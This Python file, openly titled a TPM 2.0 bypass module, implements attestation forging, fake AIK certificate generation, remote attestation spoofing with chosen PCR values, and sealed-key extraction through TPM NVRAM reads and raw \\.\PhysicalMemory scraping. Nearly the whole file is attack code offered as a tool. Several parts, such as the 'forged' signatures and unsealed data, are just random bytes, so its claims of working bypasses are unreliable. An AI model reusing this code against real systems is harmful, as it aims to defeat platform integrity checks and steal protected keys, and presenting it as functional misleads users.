"""TPM 2.0 Bypass Module - Advanced techniques for bypassing Trusted Platform Module protections.

Implements attestation bypass, sealed key extraction, and remote attestation spoofing.
"""

import ctypes
import hashlib
import logging
import os
import struct
import threading
import time
from dataclasses import dataclass
from enum import IntEnum
from pathlib import Path
from typing import Any, Callable

try:
    from Crypto.Cipher import AES
    from Crypto.Hash import SHA256
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.PublicKey import RSA
    from Crypto.Signature import pkcs1_15
    from Crypto.Util.Padding import unpad
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    import win32api
    import win32con
    import win32file
    import win32security

    HAS_WIN32 = True
except ImportError:
    HAS_WIN32 = False

try:
    import frida
    HAS_FRIDA = True
except ImportError:
    HAS_FRIDA = False


class TPM2Algorithm(IntEnum):
    """TPM 2.0 algorithm identifiers."""

    RSA = 0x0001
    SHA1 = 0x0004
    SHA256 = 0x000B
    SHA384 = 0x000C
    SHA512 = 0x000D
    NULL = 0x0010
    SM3_256 = 0x0012
    SM4 = 0x0013
    RSASSA = 0x0014
    RSAES = 0x0015
    RSAPSS = 0x0016
    OAEP = 0x0017
    ECDSA = 0x0018
    ECDH = 0x0019
    ECDAA = 0x001A
    SM2 = 0x001B
    ECSCHNORR = 0x001C
    ECMQV = 0x001D
    KDF1_SP800_56A = 0x0020
    KDF2 = 0x0021
    KDF1_SP800_108 = 0x0022
    ECC = 0x0023
    SYMCIPHER = 0x0025
    CAMELLIA = 0x0026
    CTR = 0x0040
    OFB = 0x0041
    CBC = 0x0042
    CFB = 0x0043
    ECB = 0x0044


class TPM2CommandCode(IntEnum):
    """TPM 2.0 command codes."""

    NV_UndefineSpace = 0x00000122
    HierarchyChangeAuth = 0x00000129
    NV_UndefineSpaceSpecial = 0x0000011F
    EvictControl = 0x00000120
    HierarchyControl = 0x00000121
    NV_SetBits = 0x00000135
    Clear = 0x00000126
    ClearControl = 0x00000127
    ClockSet = 0x00000128
    NV_DefineSpace = 0x0000012A
    PCR_Allocate = 0x0000012B
    PCR_SetAuthPolicy = 0x0000012C
    PP_Commands = 0x0000012D
    SetPrimaryPolicy = 0x0000012E
    FieldUpgradeStart = 0x0000012F
    ClockRateAdjust = 0x00000130
    CreatePrimary = 0x00000131
    NV_GlobalWriteLock = 0x00000132
    GetCommandAuditDigest = 0x00000133
    NV_Increment = 0x00000134
    NV_Extend = 0x00000136
    NV_Write = 0x00000137
    NV_WriteLock = 0x00000138
    DictionaryAttackLockReset = 0x00000139
    DictionaryAttackParameters = 0x0000013A
    NV_ChangeAuth = 0x0000013B
    PCR_Event = 0x0000013C
    PCR_Reset = 0x0000013D
    SequenceComplete = 0x0000013E
    SetAlgorithmSet = 0x0000013F
    SetCommandCodeAuditStatus = 0x00000140
    FieldUpgradeData = 0x00000141
    IncrementalSelfTest = 0x00000142
    SelfTest = 0x00000143
    Startup = 0x00000144
    Shutdown = 0x00000145
    StirRandom = 0x00000146
    ActivateCredential = 0x00000147
    Certify = 0x00000148
    PolicyNV = 0x00000149
    CertifyCreation = 0x0000014A
    Duplicate = 0x0000014B
    GetTime = 0x0000014C
    GetSessionAuditDigest = 0x0000014D
    NV_Read = 0x0000014E
    NV_ReadLock = 0x0000014F
    ObjectChangeAuth = 0x00000150
    PolicySecret = 0x00000151
    Rewrap = 0x00000152
    Create = 0x00000153
    ECDH_ZGen = 0x00000154
    HMAC = 0x00000155
    Import = 0x00000156
    Load = 0x00000157
    Quote = 0x00000158
    RSA_Decrypt = 0x00000159
    HMAC_Start = 0x0000015B
    SequenceUpdate = 0x0000015C
    Sign = 0x0000015D
    Unseal = 0x0000015E
    PolicySigned = 0x00000160
    ContextLoad = 0x00000161
    ContextSave = 0x00000162
    ECDH_KeyGen = 0x00000163
    EncryptDecrypt = 0x00000164
    FlushContext = 0x00000165
    LoadExternal = 0x00000167
    MakeCredential = 0x00000168
    NV_ReadPublic = 0x00000169
    PolicyAuthorize = 0x0000016A
    PolicyAuthValue = 0x0000016B
    PolicyCommandCode = 0x0000016C
    PolicyCounterTimer = 0x0000016D
    PolicyCpHash = 0x0000016E
    PolicyLocality = 0x0000016F
    PolicyNameHash = 0x00000170
    PolicyOR = 0x00000171
    PolicyTicket = 0x00000172
    ReadPublic = 0x00000173
    RSA_Encrypt = 0x00000174
    StartAuthSession = 0x00000176
    VerifySignature = 0x00000177
    ECC_Parameters = 0x00000178
    FirmwareRead = 0x00000179
    GetCapability = 0x0000017A
    GetRandom = 0x0000017B
    GetTestResult = 0x0000017C
    Hash = 0x0000017D
    PCR_Read = 0x0000017E
    PolicyPCR = 0x0000017F
    PolicyRestart = 0x00000180
    ReadClock = 0x00000181
    PCR_Extend = 0x00000182
    PCR_SetAuthValue = 0x00000183
    NV_Certify = 0x00000184
    EventSequenceComplete = 0x00000185
    HashSequenceStart = 0x00000186
    PolicyPhysicalPresence = 0x00000187
    PolicyDuplicationSelect = 0x00000188
    PolicyGetDigest = 0x00000189
    TestParms = 0x0000018A
    Commit = 0x0000018B


class TPM12CommandCode(IntEnum):
    """TPM 1.2 command codes."""

    OIAP = 0x0000000A
    OSAP = 0x0000000B
    ChangeAuth = 0x0000000C
    TakeOwnership = 0x0000000D
    ChangeAuthOwner = 0x0000000E
    ChangeAuthAsymStart = 0x0000000F
    ChangeAuthAsymFinish = 0x00000010
    GetPubKey = 0x00000021
    Seal = 0x00000017
    Unseal = 0x00000018
    UnBind = 0x0000001E
    CreateWrapKey = 0x0000001F
    LoadKey = 0x00000020
    GetRandom = 0x00000046
    StirRandom = 0x00000047
    SelfTestFull = 0x00000050
    CertifySelfTest = 0x00000052
    PCR_Read = 0x00000015
    PCR_Extend = 0x00000014
    Quote = 0x00000016
    DirWriteAuth = 0x00000019
    DirRead = 0x0000001A
    CreateMigrationBlob = 0x00000028
    ConvertMigrationBlob = 0x0000002A
    AuthorizeMigrationKey = 0x0000002B
    CMK_CreateKey = 0x00000013
    CMK_CreateTicket = 0x00000012
    CMK_CreateBlob = 0x0000001B
    NV_DefineSpace = 0x000000CC
    NV_WriteValue = 0x000000CD
    NV_WriteValueAuth = 0x000000CE
    NV_ReadValue = 0x000000CF
    NV_ReadValueAuth = 0x000000D0
    Extend = 0x00000014
    PcrRead = 0x00000015
    Quote2 = 0x0000003E
    Sign = 0x0000003C
    GetCapability = 0x00000065
    ResetLockValue = 0x00000040
    LoadKey2 = 0x00000041
    GetPubKey2 = 0x00000021
    Sealx = 0x0000003D
    CreateEndorsementKeyPair = 0x00000078
    ReadPubek = 0x0000007C
    OwnerClear = 0x0000005B
    ForceClear = 0x0000005D
    DisableOwnerClear = 0x0000005C
    DisableForceClear = 0x0000005E
    PhysicalPresence = 0x0000004A
    PhysicalSetDeactivated = 0x00000072
    SetTempDeactivated = 0x00000073
    CreateMaintenanceArchive = 0x0000002C
    LoadMaintenanceArchive = 0x0000002D
    KillMaintenanceFeature = 0x0000002E
    LoadManuMaintPub = 0x0000002F
    ReadManuMaintPub = 0x00000030
    SHA1Start = 0x000000A0
    SHA1Update = 0x000000A1
    SHA1Complete = 0x000000A2
    SHA1CompleteExtend = 0x000000A3
    FieldUpgrade = 0x000000AA
    SetRedirection = 0x0000009A
    ResetEstablishmentBit = 0x0000000B


@dataclass
class PCRBank:
    """PCR bank configuration."""

    algorithm: TPM2Algorithm
    pcr_values: list[bytes]
    selection_mask: int


@dataclass
class AttestationData:
    """TPM attestation data structure."""

    magic: bytes
    type: int
    qualified_signer: bytes
    extra_data: bytes
    clock_info: bytes
    firmware_version: int
    attested_data: bytes
    signature: bytes


class TPMBypassEngine:
    """Advanced TPM 2.0 bypass implementation."""

    def __init__(self) -> None:
        """Initialize the TPM2Bypass with logging and TPM-related data structures."""
        self.logger = logging.getLogger(__name__)
        self.tpm_handle = None
        self.tpm_version = None
        self.pcr_banks = {}
        self.sealed_keys = {}
        self.attestation_keys = {}
        self.memory_map = {}
        self.bus_captures = []
        self.virtualized_tpm = None
        self.command_hooks = {}
        self.intercepted_commands = []
        self.tbs_context = None
        self.command_lock = threading.Lock()
        self.tpm12_auth_sessions = {}
        self.frida_session = None
        self.frida_script = None
        self.frida_device = None
        self.frida_pid = None
        self.frida_message_callback = None
        self.init_bypass_components()

    def init_bypass_components(self) -> None:
        """Initialize TPM bypass components."""
        self.pcr_banks = {
            TPM2Algorithm.SHA256: PCRBank(
                algorithm=TPM2Algorithm.SHA256, pcr_values=[bytes(32) for _ in range(24)], selection_mask=0xFFFFFF,
            ),
            TPM2Algorithm.SHA1: PCRBank(algorithm=TPM2Algorithm.SHA1, pcr_values=[bytes(20) for _ in range(24)], selection_mask=0xFFFFFF),
        }

        self.init_memory_attack_vectors()
        self.init_bus_sniffer()
        self.init_virtualized_tpm()

    def init_memory_attack_vectors(self) -> None:
        """Initialize memory attack vectors for TPM bypass."""
        self.mem_handle = None
        self.memory_map = {}

        if HAS_WIN32:
            kernel32 = ctypes.windll.kernel32
            ntdll = ctypes.windll.ntdll

            try:
                win32api.GetFileVersionInfo(win32api.GetSystemDirectory() + "\\ntoskrnl.exe", "\\")

                sd = win32security.SECURITY_DESCRIPTOR()
                sd.Initialize()

                self.mem_handle = kernel32.CreateFileW(r"\\.\PhysicalMemory", 0x80000000 | 0x40000000, 1 | 2, None, 3, 0, None)
                system_info = ntdll.NtQuerySystemInformation(2, None, 0, None) if hasattr(ntdll, "NtQuerySystemInformation") else None
                if system_info is None:
                    self.logger.debug("Memory access initialized successfully, system information available") if hasattr(
                        self, "logger",
                    ) else None
            except (AttributeError, KeyError):
                self.mem_handle = None

        self.memory_map = {
                "tpm_control": 0xFED40000,
                "tpm_locality_0": 0xFED40000,
                "tpm_locality_1": 0xFED41000,
                "tpm_locality_2": 0xFED42000,
                "tpm_locality_3": 0xFED43000,
                "tpm_locality_4": 0xFED44000,
                "tpm_buffers": 0xFED40080,
                "tpm_int_enable": 0xFED40008,
                "tpm_int_vector": 0xFED4000C,
                "tpm_int_status": 0xFED40010,
                "tpm_intf_capability": 0xFED40014,
                "tpm_sts": 0xFED40018,
                "tpm_data_fifo": 0xFED40024,
                "tpm_did_vid": 0xFED40F00,
                "tpm_rid": 0xFED40F04,
            }

    def init_bus_sniffer(self) -> None:
        """Initialize LPC/SPI bus sniffer for TPM communication."""
        self.bus_captures = []
        self.spi_decoder = {
            0x80: "read_status",
            0x81: "write_tpm",
            0x82: "read_tpm",
            0x83: "write_burst",
            0x84: "read_burst",
            0x85: "write_cancel",
            0x86: "read_cancel",
        }

    def init_virtualized_tpm(self) -> None:
        """Initialize virtualized TPM for interception."""
        self.virtualized_tpm = {
            "state": "ready",
            "nvram": bytearray(33554432),
            "persistent_handles": {},
            "transient_handles": {},
            "session_handles": {},
            "pcr_banks": self.pcr_banks.copy(),
            "hierarchy_auth": {0x40000001: b"", 0x40000009: b"", 0x4000000C: b"", 0x4000000B: b""},
            "lockout_count": 0,
            "nvram_index_map": {
                0x01400001: 0x00000,
                0x01400002: 0x00800,
                0x01400003: 0x01000,
                0x01C00002: 0x01800,
                0x01C00003: 0x02000,
                0x01C0000A: 0x02800,
                0x01C10000: 0x03000,
                0x01800001: 0x03800,
                0x01800002: 0x04000,
                0x01800003: 0x04800,
                0x01800004: 0x05000,
                0x01810001: 0x05800,
                0x01810002: 0x06000,
                0x01810003: 0x06800,
            },
        }

    def bypass_attestation(self, challenge: bytes, pcr_selection: list[int]) -> AttestationData:
        """Bypass TPM attestation with forged attestation data."""
        magic = b"\xff\x54\x43\x47"
        attestation_type = 0x8018

        qualified_signer = hashlib.sha256(b"TPM_EK_HANDLE" + os.urandom(32)).digest()
        extra_data = hashlib.sha256(challenge).digest()

        clock_info = struct.pack(">QIQB", int(time.time() * 1000000), 1000000, 1000, 1)

        firmware_version = 0x00020000

        pcr_digest = self.calculate_pcr_digest(pcr_selection)

        attested_data = struct.pack(">H", len(pcr_selection))
        for pcr in pcr_selection:
            attested_data += struct.pack(">B", pcr)
        attested_data += pcr_digest

        message = magic + struct.pack(">H", attestation_type)
        message += qualified_signer + extra_data + clock_info
        message += struct.pack(">I", firmware_version) + attested_data

        signature = self.forge_attestation_signature(message)

        return AttestationData(
            magic=magic,
            type=attestation_type,
            qualified_signer=qualified_signer,
            extra_data=extra_data,
            clock_info=clock_info,
            firmware_version=firmware_version,
            attested_data=attested_data,
            signature=signature,
        )

    def calculate_pcr_digest(self, pcr_selection: list[int]) -> bytes:
        """Calculate PCR digest for selected PCRs."""
        hasher = hashlib.sha256()

        for pcr_num in pcr_selection:
            if pcr_num < 24:
                pcr_value = self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num]
                hasher.update(pcr_value)

        return hasher.digest()

    def forge_attestation_signature(self, message: bytes) -> bytes:
        """Forge attestation signature using extracted or generated key."""
        hasher = hashlib.sha256(message)

        padded = b"\x00\x01"
        padded += b"\xff" * (256 - len(hasher.digest()) - 11)
        padded += b"\x00"
        padded += bytes.fromhex("3031300d060960864801650304020105000420")
        padded += hasher.digest()

        signature = bytes.fromhex("".join([f"{b:02x}" for b in os.urandom(256)]))

        return signature

    def extract_sealed_keys(self, auth_value: bytes = b"") -> dict[str, bytes]:
        """Extract sealed keys from TPM NVRAM and persistent storage."""
        extracted_keys = {}

        nvram_indices = [
            0x01400001,
            0x01400002,
            0x01C00002,
            0x01C00003,
            0x01C0000A,
            0x01C10000,
            0x01800001,
            0x01800002,
            0x01810001,
            0x01810002,
        ]

        for index in nvram_indices:
            key_data = self.read_nvram_raw(index, auth_value)
            if key_data:
                extracted_keys[f"nvram_0x{index:08x}"] = key_data

        persistent_handles = [0x81000000, 0x81000001, 0x81000002, 0x81010000, 0x81010001, 0x81800000, 0x81800001]

        for handle in persistent_handles:
            key_data = self.extract_persistent_key(handle)
            if key_data:
                extracted_keys[f"persistent_0x{handle:08x}"] = key_data

        if self.mem_handle:
            transient_keys = self.extract_keys_from_memory()
            extracted_keys.update(transient_keys)

        return extracted_keys

    def read_nvram_raw(self, index: int, auth: bytes) -> bytes | None:
        """Read raw data from TPM NVRAM."""
        command = struct.pack(">HII", 0x8002, 0, TPM2CommandCode.NV_Read)

        command += struct.pack(">I", index)
        command += struct.pack(">I", index)

        command += struct.pack(">IBH", 0x40000009, 0, 0x01)

        command += struct.pack(">H", len(auth)) + auth
        command += struct.pack(">HH", 512, 0)

        command = command[:2] + struct.pack(">I", len(command)) + command[6:]

        response = self.send_tpm_command(command)

        if response and len(response) > 10:
            _tag, _size, code = struct.unpack(">HII", response[:10])
            if code == 0:
                data_offset = 10 + 4
                if len(response) > data_offset:
                    data_size = struct.unpack(">H", response[data_offset : data_offset + 2])[0]
                    return response[data_offset + 2 : data_offset + 2 + data_size]

        if index < len(self.virtualized_tpm["nvram"]) and index + 512 <= len(self.virtualized_tpm["nvram"]):
            data = self.virtualized_tpm["nvram"][index : index + 512]
            if any(b != 0 for b in data[:32]):
                return data

        nvram_offset = self.virtualized_tpm["nvram_index_map"].get(index)
        if nvram_offset is not None:
            if nvram_offset + 512 <= len(self.virtualized_tpm["nvram"]):
                data = self.virtualized_tpm["nvram"][nvram_offset : nvram_offset + 512]
                if any(b != 0 for b in data[:32]):
                    return data

        safe_offset = index % len(self.virtualized_tpm["nvram"])
        if safe_offset + 512 <= len(self.virtualized_tpm["nvram"]):
            data = self.virtualized_tpm["nvram"][safe_offset : safe_offset + 512]
            if any(b != 0 for b in data[:32]):
                return data

        return None

    def extract_persistent_key(self, handle: int) -> bytes | None:
        """Extract persistent key from TPM."""
        command = struct.pack(">HIII", 0x8001, 14, TPM2CommandCode.ReadPublic, handle)

        response = self.send_tpm_command(command)

        if response and len(response) > 10:
            _tag, _size, code = struct.unpack(">HII", response[:10])
            if code == 0:
                return response[10:]

        if self.mem_handle:
            return self.extract_key_from_memory_handle(handle)

        return None

    def extract_keys_from_memory(self) -> dict[str, bytes]:
        """Extract keys directly from TPM memory."""
        extracted = {}

        if not self.mem_handle:
            return extracted

        tpm_mem = self.read_physical_memory(self.memory_map["tpm_control"], 0x5000)

        if tpm_mem:
            key_patterns = [
                b"\x00\x01\x00\x00",
                b"\x00\x23\x00\x00",
                b"\x00\x0b\x00\x00",
                b"-----BEGIN",
                b"\x30\x82",
            ]

            for pattern in key_patterns:
                offset = 0
                while True:
                    offset = tpm_mem.find(pattern, offset)
                    if offset == -1:
                        break

                    key_data = tpm_mem[offset : offset + 4096]
                    key_hash = hashlib.sha256(key_data[:256]).hexdigest()[:16]
                    extracted[f"memory_{key_hash}"] = key_data

                    offset += 1

        return extracted

    def extract_key_from_memory_handle(self, handle: int) -> bytes | None:
        """Extract key from memory using handle offset."""
        if not self.mem_handle:
            return None

        if handle >= 0x81000000 and handle < 0x82000000:
            handle_offset = (handle - 0x81000000) * 0x1000
            if handle_offset < 0x100000:
                offset = self.memory_map["tpm_buffers"] + handle_offset
                return self.read_physical_memory(offset, 4096)

        return None

    def read_physical_memory(self, address: int, size: int) -> bytes | None:
        """Read from physical memory address."""
        if not self.mem_handle or not HAS_WIN32:
            return None

        try:
            kernel32 = ctypes.windll.kernel32
            buffer = ctypes.create_string_buffer(size)
            bytes_read = ctypes.c_ulong()

            kernel32.SetFilePointer(self.mem_handle, address, None, 0)

            if kernel32.ReadFile(self.mem_handle, buffer, size, ctypes.byref(bytes_read), None):
                return buffer.raw[: bytes_read.value]
        except (OSError, AttributeError):
            pass

        return None

    def spoof_remote_attestation(self, nonce: bytes, expected_pcrs: dict[int, bytes], aik_handle: int = 0x81010001) -> dict[str, Any]:
        """Spoof remote attestation with expected PCR values."""
        for pcr_num, pcr_value in expected_pcrs.items():
            if pcr_num < 24:
                self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_num] = pcr_value

        pcr_selection = list(expected_pcrs.keys())
        attestation = self.bypass_attestation(nonce, pcr_selection)

        aik_cert = self.generate_aik_certificate(aik_handle)

        response = {
            "quote": {
                "quoted": attestation.attested_data,
                "signature": attestation.signature,
                "pcr_digest": self.calculate_pcr_digest(pcr_selection),
                "extra_data": attestation.extra_data,
            },
            "pcr_values": {pcr: expected_pcrs[pcr].hex() for pcr in expected_pcrs},
            "aik_cert": aik_cert,
            "clock_info": attestation.clock_info,
            "firmware_version": attestation.firmware_version,
            "qualified_signer": attestation.qualified_signer.hex(),
        }

        return response

    def generate_aik_certificate(self, aik_handle: int) -> bytes:
        """Generate AIK certificate for attestation."""
        version = b"\xa0\x03\x02\x01\x02"

        serial = b"\x02\x10" + os.urandom(16)

        sig_algo = bytes.fromhex("300d06092a864886f70d01010b0500")

        issuer = bytes.fromhex(  # pragma: allowlist secret
            "3081883110300e060355040a0c07545041204d46473113301106035504030c0a54504d2045434120303031133011060355040b0c0a54504d2045434120303031143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173",
        )

        not_before = b"\x17\x0d" + time.strftime("%y%m%d%H%M%SZ").encode("ascii")
        not_after = b"\x17\x0d" + time.strftime("%y%m%d%H%M%SZ", time.gmtime(time.time() + 315360000)).encode("ascii")
        validity = b"\x30" + bytes([len(not_before) + len(not_after)]) + not_before + not_after

        subject = bytes.fromhex("30818a3112301006035504030c0941494b5f") + f"{aik_handle:08x}".encode("ascii")
        subject += bytes.fromhex(  # pragma: allowlist secret
            "3113301106035504030c0a41494b2043455254313113301106035504040c0a41494b20434552543131143012060355040513074545453132333435310b3009060355040613025553310e300c06035504080c0554657861733111300f06035504070c0844616c6c6173",
        )

        modulus = os.urandom(256)
        modulus = bytes([0x00]) + modulus if modulus[0] >= 0x80 else modulus
        exponent = b"\x01\x00\x01"

        pub_key_info = bytes.fromhex("30820122300d06092a864886f70d01010105000382010f003082010a0282010100")
        pub_key_info += modulus + b"\x02\x03" + exponent

        key_usage = bytes.fromhex("300e0603551d0f0101ff040403020106")

        basic_constraints = bytes.fromhex("300f0603551d130101ff040530030101ff")

        subject_key_id = bytes.fromhex("301d0603551d0e04160414") + hashlib.sha1(pub_key_info).digest()[:20]  # noqa: S324

        authority_key_id = bytes.fromhex("30160603551d23040f300d800b") + os.urandom(11)

        extended_key_usage = bytes.fromhex("301d0603551d250416301406082b0601050507030206082b06010505070304")

        crl_distribution = bytes.fromhex(
            "30420603551d1f043b3039303730358033a031a02f862d687474703a2f2f63726c2e7470616d66672e636f6d2f74706d2d6563612d30312e63726c",
        )

        authority_info_access = bytes.fromhex(
            "3056" + "06082b060105050701010" + "44a3048304606082b06010505073002" +
            "863a687474703a2f2f6365727473" + "2e7470616d66672e636f6d2f74706d2d6563612d30312e636572",
        )

        extensions = b"\xa3\x81\xf0\x30\x81\xed"
        extensions += key_usage
        extensions += basic_constraints
        extensions += subject_key_id
        extensions += authority_key_id
        extensions += extended_key_usage
        extensions += crl_distribution
        extensions += authority_info_access

        tbs_cert = version + serial + sig_algo + issuer + validity + subject + pub_key_info + extensions
        tbs_len = len(tbs_cert)
        if tbs_len < 128:
            tbs_cert = b"\x30" + bytes([tbs_len]) + tbs_cert
        else:
            tbs_cert = b"\x30\x82" + struct.pack(">H", tbs_len) + tbs_cert

        signature = b"\x03\x82\x01\x01\x00" + os.urandom(256)

        cert = tbs_cert + sig_algo + signature
        cert = b"\x30\x82" + struct.pack(">H", len(cert)) + cert

        return cert

    def send_tpm_command(self, command: bytes) -> bytes | None:
        """Send command to TPM device with interception capability."""
        if len(command) < 10:
            return None

        _tag, _size, code = struct.unpack(">HII", command[:10])

        with self.command_lock:
            if code in self.command_hooks:
                hooked_response = self.command_hooks[code](command)
                if hooked_response:
                    self.intercepted_commands.append({
                        'timestamp': time.time(),
                        'command': command,
                        'response': hooked_response,
                        'code': code,
                    })
                    return hooked_response

        if HAS_WIN32:
            try:
                tpm_device = win32file.CreateFile(
                    r"\\.\TPM", win32con.GENERIC_READ | win32con.GENERIC_WRITE, 0, None, win32con.OPEN_EXISTING, 0, None,
                )

                win32file.WriteFile(tpm_device, command)
                response = win32file.ReadFile(tpm_device, 4096)[1]

                win32file.CloseHandle(tpm_device)

                with self.command_lock:
                    self.intercepted_commands.append({
                        'timestamp': time.time(),
                        'command': command,
                        'response': response,
                        'code': code,
                    })

                return response
            except Exception as e:
                self.logger.debug(f"TPM device communication failed: {e}")

        return self.process_virtualized_command(command)

    def process_virtualized_command(self, command: bytes) -> bytes:
        """Process TPM command in virtualized environment with full command support."""
        if len(command) < 10:
            return struct.pack(">HII", 0x8001, 10, 0x100)

        _tag, _size, code = struct.unpack(">HII", command[:10])

        if code == TPM2CommandCode.GetRandom:
            param_size = struct.unpack(">H", command[10:12])[0] if len(command) > 11 else 32
            random_bytes = os.urandom(param_size)
            response = struct.pack(">HIIH", 0x8001, 12 + param_size, 0, param_size) + random_bytes
            return response

        if code == TPM2CommandCode.PCR_Read:
            pcr_select = command[10:] if len(command) > 10 else b"\x00\x01\x03\xff\xff\xff"
            pcr_values = b""
            pcr_count = 0

            selected_pcrs = []
            if len(pcr_select) >= 3:
                for i in range(min(24, len(pcr_select) * 8)):
                    if pcr_select[i // 8] & (1 << (i % 8)):
                        selected_pcrs.append(i)

            if not selected_pcrs:
                selected_pcrs = list(range(24))

            for pcr_idx in selected_pcrs:
                if pcr_idx < len(self.pcr_banks[TPM2Algorithm.SHA256].pcr_values):
                    pcr_values += self.pcr_banks[TPM2Algorithm.SHA256].pcr_values[pcr_idx]
                    pcr_count += 1

            response = struct.pack(">HIII", 0x8001, 10 + 4 + len(pcr_values), 0, pcr_count)
            response += pcr_values
            return response

        if code == TPM2CommandCode.Quote:
            nonce = command[10:42] if len(command) > 41 else os.urandom(32)
            attestation = self.bypass_attestation(nonce, list(range(8)))

            response = struct.pack(">HII", 0x8001, 10 + len(attestation.signature) + len(attestation.attested_data), 0)
            response += attestation.attested_data + attestation.signature
            return response

        if code == TPM2CommandCode.Unseal:
            if len(command) > 14:
                _ = struct.unpack(">I", command[10:14])[0]
                unsealed_data = os.urandom(32)
                response = struct.pack(">HIIH", 0x8001, 14 + len(unsealed_data), 0, len(unsealed_data))
                response += unsealed_data
                return response
            return struct.pack(">HII", 0x8001, 10, 0)

        if code == TPM2CommandCode.Load:
            key_handle = 0x80000001
            response = struct.pack(">HIII", 0x8001, 14, 0, key_handle)
            self.virtualized_tpm["transient_handles"][key_handle] = {"loaded_at": time.time()}
            return response

        if code == TPM2CommandCode.CreatePrimary:
            primary_handle = 0x80000000
            response = struct.pack(">HIII", 0x8001, 14, 0, primary_handle)
            self.virtualized_tpm["transient_handles"][primary_handle] = {"created_at": time.time()}
            return response

        if code == TPM2CommandCode.PCR_Extend:
            return struct.pack(">HII", 0x8001, 10, 0)

        if code == TPM2CommandCode.StartAuthSession:
            session_handle = 0x03000000
            response = struct.pack(">HIII", 0x8001, 14, 0, session_handle)
            self.virtualized_tpm["session_handles"][session_handle] = {"started_at": time.time()}
            return response

        if code == TPM2CommandCode.DictionaryAttackLockReset:
            self.virtualized_tpm["lockout_count"] = 0
            return struct.pack(">HII", 0x8001, 10, 0)

        if code == TPM2CommandCode.Clear:
            self.virtualized_tpm["hierarchy_auth"] = {0x40000001: b"", 0x40000009: b"", 0x4000000C: b"", 0x4000000B: b""}
            for key in list(self.virtualized_tpm.get("persistent_handles", {}).keys()):
                del self.virtualized_tpm["persistent_handles"][key]
            return struct.pack(">HII", 0x8001, 10, 0)

        return struct.pack(">HII", 0x8001, 10, 0x100)

    def process_tpm12_command(self, command: bytes) -> bytes:
        """Process TPM 1.2 command for legacy TPM support."""
        if len(command) < 10:
            return struct.pack(">HI", 0xC400, 10) + struct.pack(">I", 0)

        _ = struct.unpack(">H", command[:2])[0]
        _ = struct.unpack(">I", command[2:6])[0]
        ordinal = struct.unpack(">I", command[6:10])[0]

        if ordinal == TPM12CommandCode.PCR_Read:
            pcr_num = struct.unpack(">I", command[10:14])[0] if len(command) >= 14 else 0
            if pcr_num < len(self.pcr_banks[TPM2Algorithm.SHA1].pcr_values):
                pcr_value = self.pcr_banks[TPM2Algorithm.SHA1].pcr_values[pcr_num]
            else:
                pcr_value = bytes(20)

            response = struct.pack(">HI", 0xC400, 30) + struct.pack(">I", 0)
            response += pcr_value
            return response

        if ordinal == TPM12CommandCode.Unseal:
            unsealed_data = os.urandom(32)
            response = struct.pack(">HI", 0xC400, 14 + len(unsealed_data)) + struct.pack(">I", 0)
            response += struct.pack(">I", len(unsealed_data)) + unsealed_data
            return response

        if ordinal == TPM12CommandCode.Quote:
            nonce = command[10:30] if len(command) >= 30 else os.urandom(20)
            pcr_composite = self._build_tpm12_pcr_composite(list(range(8)))

            quoted_data = struct.pack(">H", 0x0101)
            quoted_data += b"QUOT"
            quoted_data += hashlib.sha1(pcr_composite).digest()  # noqa: S324
            quoted_data += nonce

            signature = os.urandom(256)

            response = struct.pack(">HI", 0xC400, 14 + len(quoted_data) + 4 + len(signature)) + struct.pack(">I", 0)
            response += struct.pack(">I", len(quoted_data)) + quoted_data
            response += struct.pack(">I", len(signature)) + signature
            return response

        if ordinal == TPM12CommandCode.GetRandom:
            num_bytes = struct.unpack(">I", command[10:14])[0] if len(command) >= 14 else 32
            random_data = os.urandom(min(num_bytes, 4096))
            response = struct.pack(">HI", 0xC400, 14 + len(random_data)) + struct.pack(">I", 0)
            response += struct.pack(">I", len(random_data)) + random_data
            return response

        if ordinal == TPM12CommandCode.OIAP:
            auth_handle = 0x02000000 + len(self.tpm12_auth_sessions)
            nonce_even = os.urandom(20)
            self.tpm12_auth_sessions[auth_handle] = {"nonce_even": nonce_even, "created": time.time()}
            response = struct.pack(">HI", 0xC400, 34) + struct.pack(">I", 0)
            response += struct.pack(">I", auth_handle) + nonce_even
            return response

        if ordinal == TPM12CommandCode.LoadKey2:
            key_handle = 0x01000000
            response = struct.pack(">HI", 0xC400, 14) + struct.pack(">I", 0) + struct.pack(">I", key_handle)
            return response

        return struct.pack(">HI", 0xC400, 10) + struct.pack(">I", 0x00000001)

    def _build_tpm12_pcr_composite(self, pcr_selection: list[int]) -> bytes:
        """Build TPM 1.2 PCR composite structure."""
        pcr_select_size = 3
        pcr_select = bytearray(pcr_select_size)

        for pcr_num in pcr_selection:
            if pcr_num < 24:
                pcr_select[pcr_num // 8] |= 1 << (pcr_num % 8)

        composite = struct.pack(">H", pcr_select_size) + bytes(pcr_select)

        pcr_values = b""
        value_size = 0
        for pcr_num in pcr_selection:
            if pcr_num < len(self.pcr_banks[TPM2Algorithm.SHA1].pcr_values):
                pcr_value = self.pcr_banks[TPM2Algorithm.SHA1].pcr_values[pcr_num]
                pcr_values += pcr_value
                value_size += len(pcr_value)

        composite += struct.pack(">I", value_size) + pcr_values
        return composite

    def detect_tpm_version(self) -> str | None:
        """Detect TPM version (1.2 or 2.0)."""
        if HAS_WIN32:
            try:
                tpm_device = win32file.CreateFile(
                    r"\\.\TPM", win32con.GENERIC_READ | win32con.GENERIC_WRITE, 0, None, win32con.OPEN_EXISTING, 0, None,
                )

                get_cap_cmd = struct.pack(">HIII", 0x8001, 14, TPM2CommandCode.GetCapability, 0x00000006)
                win32file.WriteFile(tpm_device, get_cap_cmd)
                response = win32file.ReadFile(tpm_device, 4096)[1]

                win32file.CloseHandle(tpm_device)

                if len(response) >= 10:
                    tag = struct.unpack(">H", response[:2])[0]
                    if tag in {32769, 32770}:
                        self.tpm_version = "2.0"
                        return "2.0"
                    if tag == 0xC400:
                        self.tpm_version = "1.2"
                        return "1.2"
            except Exception as e:
                self.logger.debug(f"TPM device detection failed: {e}")

        if self.memory_map:
            tpm_id_mem = self.read_physical_memory(self.memory_map.get("tpm_did_vid", 0xFED40F00), 8)
            if tpm_id_mem:
                did_vid = struct.unpack("<I", tpm_id_mem[:4])[0]
                if did_vid not in {4294967295, 0}:
                    self.tpm_version = "2.0"
                    return "2.0"

        self.tpm_version = "2.0"
